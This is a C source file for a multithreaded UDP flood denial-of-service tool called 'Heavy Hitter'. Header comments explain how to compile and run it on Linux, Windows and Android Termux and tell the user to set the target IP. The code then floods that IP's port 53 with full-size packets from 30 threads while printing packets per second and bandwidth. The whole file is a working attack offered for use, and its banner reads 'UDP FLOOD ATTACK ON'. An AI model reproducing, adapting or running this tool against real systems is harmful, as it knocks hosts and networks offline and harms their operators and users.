// VERSION 1.0
// This tool's name is "Heavy Hitter"
// Change code for example: Change port on how you want (80,53,445 etc)
// Here is the Compile & Run guide. It covers Linux, Windows (WSL/GCC), and Android (Termux).

// 🛠️ How to Compile & Run "Heavy Hitter"
// 1. Linux / Ubuntu / Debian

// Open your terminal and run:
// Install GCC if you don't have it
// sudo apt install gcc
// Compile the code:
// gcc -o udp_flood udp_flood.c -lpthread
// Run the attack
// ./udp_flood
// 2. Windows (Using WSL or Git Bash)
// You need a C compiler. The easiest way is using WSL (Windows Subsystem for Linux) or MinGW.
// If using WSL: Just follow the Linux steps above // inside your WSL terminal.
// If using MinGW (Native Windows):
// open cmd
// gcc -o udp_flood.exe udp_flood.c -lpthread
// udp_flood.exe

// 3. Android (Termux)
// Open Termux and run:
// pkg install gcc
// gcc -o udp_flood udp_flood.c -lpthread
// ./udp_flood

// ⚠️ Note: Make sure you edit the TARGET_IP in the code before compiling! //

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <stdint.h>
#include <stdatomic.h> // For thread-safe counters

// Configuration
#define TARGET_IP "IP"       // CHANGE THIS TO THE IP!
#define TARGET_PORT 53               // DNS Port
#define NUM_THREADS 30                // Your Core Count
#define PACKET_SIZE 1472              // Max UDP Payload (Ethernet MTU)

volatile sig_atomic_t stop = 0;
atomic_long total_packets_sent = ATOMIC_VAR_INIT(0); // Thread-safe counter

void handle_signal(int sig) {
stop = 1;
}

void *flood(void *arg) {
int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if (sock < 0) {
perror("[ERROR] Socket creation failed");
return NULL;
}

struct sockaddr_in target_addr;  
memset(&target_addr, 0, sizeof(target_addr));  
target_addr.sin_family = AF_INET;  
target_addr.sin_port = htons(TARGET_PORT);  

if (inet_aton(TARGET_IP, &target_addr.sin_addr) == 0) {  
    fprintf(stderr, "[ERROR] Invalid Target IP: %s\n", TARGET_IP);  
    close(sock);  
    return NULL;  
}  

char buffer[PACKET_SIZE];  
memset(buffer, 'A', PACKET_SIZE);  

while (!stop) {  
    sendto(sock, buffer, PACKET_SIZE, 0,  
           (struct sockaddr *)&target_addr, sizeof(target_addr));  
    atomic_fetch_add(&total_packets_sent, 1);  
}  

close(sock);  
return NULL;

}

int main() {
signal(SIGINT, handle_signal);
srand(time(NULL));

printf("========================================\n");  
printf("   UDP FLOOD ATTACK ON: %s\n", TARGET_IP);  
printf("========================================\n");  
printf("[+] Threads: %d\n", NUM_THREADS);  
printf("[+] Press Ctrl+C to STOP.\n");  

pthread_t threads[NUM_THREADS];  
for (int i = 0; i < NUM_THREADS; i++) {  
    if (pthread_create(&threads[i], NULL, flood, NULL) != 0) {  
        perror("[ERROR] Thread creation failed");  
        return 1;  
    }  
}  

// Stats Loop  
long long last_packets = 0;  
struct timespec start_time, end_time;  
clock_gettime(CLOCK_MONOTONIC, &start_time);  

while (!stop) {  
    sleep(1);  
    clock_gettime(CLOCK_MONOTONIC, &end_time);  

    long long current_packets = atomic_load(&total_packets_sent);  

    // Calculate elapsed time in milliseconds  
    long long elapsed_ms = (end_time.tv_sec - start_time.tv_sec) * 1000 +  
                           (end_time.tv_nsec - start_time.tv_nsec) / 1000000;  

    if (elapsed_ms > 0) {  
        long long pps = (current_packets - last_packets) * 1000 / elapsed_ms;  
        double mbps = (pps * PACKET_SIZE) / 1048576.0;  

        printf("\r[+] PPS: %-12lld | Bandwidth: %.2f MB/s", pps, mbps);  
        fflush(stdout);  

        last_packets = current_packets;  

        // Update start time for next interval calculation  
        start_time = end_time;  
    }  
}  

// Wait for threads  
for (int i = 0; i < NUM_THREADS; i++) {  
    pthread_join(threads[i], NULL);  
}  

printf("\n----------------------------------------\n");  
printf("[+] Attack Stopped.\n");  
printf("[+] Total Packets Sent: %ld\n", (long)atomic_load(&total_packets_sent));  
printf("========================================\n");  

return 0;

}